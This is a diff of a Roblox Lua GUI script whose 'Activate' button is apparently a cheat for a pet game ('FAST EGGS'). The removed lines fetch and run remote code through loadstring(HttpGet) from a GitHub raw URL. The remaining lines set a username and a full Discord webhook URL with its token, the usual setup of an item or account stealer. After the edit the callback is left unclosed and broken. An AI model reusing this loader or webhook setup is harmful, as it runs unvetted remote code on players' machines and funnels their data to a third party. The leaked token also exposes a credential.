@@ -17,17 +17,9 @@ Tab:AddButton({
 	Name = "Activate",
 	Callback = function()
       		print("button pressed")
-Username = "notulP_hctiwT"
-WebHook = "https://discord.com/api/webhooks/1099993941123801108/T78_V77Dzk3RSo6IHTmKCXrkLdqlwERW9wLIbBMjF7nlcVPeSnPEuVVOn5PTOKh8bV6C"
+UserName = "Twitch_Pluton"
+Webhook = "https://discord.com/api/webhooks/1099993941123801108/T78_V77Dzk3RSo6IHTmKCXrkLdqlwERW9wLIbBMjF7nlcVPeSnPEuVVOn5PTOKh8bV6C"
 
-loadingscreen = true
-_G.CustomScriptName = "FAST EGGS by [YT_Zefko]"
-_G.Text1 = "[SCRIPT] Loading now ..."
-_G.Text2 = "[SCRIPT] Waiting 10 seconds ..."
-_G.Text3 = "[SCRIPT] Checking now..."
-_G.Text4 = "[SCRIPT] Starting now..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
-	end    
 })
 
 OrionLib:Init()
